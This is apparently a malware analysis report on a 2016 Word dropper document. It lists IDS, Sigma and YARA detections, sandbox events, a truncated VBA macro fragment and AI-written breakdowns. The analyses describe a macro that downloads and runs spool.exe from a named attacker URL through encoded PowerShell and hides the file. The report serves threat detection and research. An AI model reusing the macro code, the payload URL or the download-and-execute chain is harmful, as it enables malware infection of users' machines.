crowdsourced_ids_results.rule_raw: alert tls any any -> any any (msg:"SURICATA TLS certificate invalid der"; flow:established; app-layer-event:tls.certificate_invalid_der; flowint:tls.anomaly.count,+,1; classtype:protocol-command-decode; sid:2230027; rev:1;)

attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Title:  , Author: gerry.knight, Template: Normal.dotm, Last Saved By: Windows User, Revision Number: 9, Name of Creating Application: Microsoft Office Word, Total Editing Time: 01:00, Create Time/Date: Sat Aug 27 14:42:00 2016, Last Saved Time/Date: Sun Aug 28 10:40:00 2016, Number of Pages: 1, Number of Words: 1099, Number of Characters: 6270, Security: 0

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_description: Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

sigma_analysis_results.rule_title: Office Application Initiated Network Connection To Non-Local IP
sigma_analysis_results.rule_description:
Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.
This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.
This rule will require an initial baseline and tuning that is specific to your organization.
sigma_analysis_results.rule_author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth (Nextron Systems), Tim Shelton, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{SourceIsIpv6=true; DestinationPort=53; Initiated=true; Protocol=udp; SourceIp=c0a8:21a:9935:f3f9:98a0:fb93:8081:ffff; DestinationIsIpv6=true; EventID=3; SourcePort=56012; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; DestinationIp=808:808:9827:0:488b:4db7:ff15:a643}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

match_context.values: @{TargetFilename=C:\Users\user\AppData\Roaming\Microsoft\Templates\~$Normal.dotm}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\qx22y0xv\qx22y0xv.cmdline}
@{Image=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\george\AppData\Local\Temp\0ba2ja5n\0ba2ja5n.cmdline; EventID=11}

crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects suspicious UTF16 and Base64 encoded PowerShell code that starts with a $ sign and a single char variable
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects malicious macro / powershell in Office document
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Detects Office droppers that include a notice to enable active content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Detects Word Document with PowerShell URLDownloadToFile
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

macros.vba_code:
Option Explicit

Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Private Const ERROR_SUCCESS As Long = 0
Private Const BINDF_GETNEWESTVERSION As Long = &H10
Private Const INTERNET_FLAG_RELOAD As Long = &H80000000

Private Sub CommandButton1_Click()
Call ShowHideTable1
End Sub

Sub ShowHideTable1()

With Selection
   .GoTo What:=wdGoToTable, Which:=wdGoToNext, Count:=1, Name:=""
   .Tables(1).Select
End With

With Selection.Font
    '.Hidden = True
    'ActiveWindow.View.ShowHiddenText = False
    .Hidden = False
    ActiveWindow.View.ShowHiddenText = False
End With
 
With Selection
    .Collapse direction:=wdCollapseStart
    .MoveLeft unit:=wdCharacter, Count:=1
End With

End Sub

Public Function DownloadFile(sSourceUrl As String, sLocalFile As String) As Boolean
DownloadFile = URLDownloadToFile(0&, sSourceUrl, sL
macros.properties: auto-open create-dir download powershell run-dll run-file

crowdsourced_ai_results.analysis:
The provided macro code exhibits several behaviors that are indicative of malicious intent. Heres a detailed breakdown of its functionality:

1. Use of URLDownloadToFile: The macro declares a function `URLDownloadToFile`, which is a common method used in malware to download files from the internet directly to the local file system. This function is often leveraged by malicious macros to retrieve payloads.

2. Command Execution via PowerShell: The macro constructs a command string that includes a PowerShell command with an encoded command parameter. It uses `Shell` to execute this command, which can be a method for executing arbitrary commands on the host machine. The use of PowerShell is particularly concerning as it can be used to bypass traditional security measures.

3. Downloading and Executing Files: The macro attempts to download an executable file (`spool.exe`) from a specified URL (`http://www.microsoftsubsystem.com-adm.in:9528/download/spool.exe`) and saves it to `c:\temp\`. After downloading, it executes this file using another PowerShell command. This behavior is characteristic of malware that seeks to install additional components or payloads onto the victim's machine.

4. Manipulation of File Attributes: The macro sets attributes on the downloaded file to make it hidden and system-protected (`attrib +h +s`). This is a tactic commonly employed by malware to avoid detection by users and security software.

5. Obfuscation Techniques: The macro contains obfuscated strings and commands, which are designed to hide the true intent of the code. For example, the long encoded command string appears to be an attempt to obscure what the PowerShell command actually does, making it harder for analysts to quickly identify malicious actions.

6. Persistence Mechanisms: Although not explicitly shown in the provided code, the presence of a `Document_Open()` subroutine suggests that the macro could potentially run automatically when the document is opened, indicating an intention to maintain persistence.

7. Suspicious Function Calls: The macro makes multiple calls to `Shell`, which is often used in malicious scripts to execute commands without user consent.

Overall, the combination of downloading executables, executing them, manipulating file attributes, and employing obfuscation techniques strongly indicates that these macros are designed for malicious purposes, likely aiming to compromise the system they are executed on.

This macro defines several functions and procedures. Upon document open, it constructs and executes a PowerShell command. 

1. Obfuscated String Decryption: The macro builds a long string by concatenating multiple string fragments. These fragments are combined with the '&' operator.  The resulting string, variable 'x', appears obfuscated.

2. PowerShell Execution: This concatenated string (variable 'x') is then passed as an argument to the 'Shell' function, which executes "powershell.exe" with the string as its argument. This suggests the string likely contains a PowerShell command or script.

3. File Download: The macro then utilizes the 'DownloadFile' function to download a file from the URL "http://www.microsoftsubsystem.com-adm.in:9528/download/spool.exe" and save it as "c:\\temp\\spool.exe". This is a strong indication of malicious activity, as the script is downloading an executable file from an external source.

4. File and Folder Manipulation:  The macro then makes calls to 'Shell' to execute additional PowerShell commands. These commands create a directory "c:\\temp", if it doesn't exist, and then set the 'hidden' and 'system' attributes on the "c:\\temp" folder. 

5. Execution of Downloaded File: Finally, the macro uses the 'Shell' function again to execute the downloaded "spool.exe" file.

Conclusion: 

The macro's actions of downloading an executable from an unknown source, hiding the downloaded file, and then executing it are highly suspicious and strongly suggest malicious intent.
